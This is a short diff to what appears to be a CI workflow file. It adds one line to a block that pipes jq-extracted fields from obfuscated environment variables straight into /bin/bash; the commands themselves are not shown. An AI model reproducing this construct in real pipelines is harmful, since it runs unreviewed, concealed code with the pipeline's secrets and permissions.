@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$e6797" | jq -r .evmfu19 | /bin/bash
           echo $iyccn7258 | jq -r .bnj87194 | /bin/bash
           echo $qdhn06419 | jq -r .cjq243 | /bin/bash
+          printf '%s' "$gzdhi107" | jq -r .do20335 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
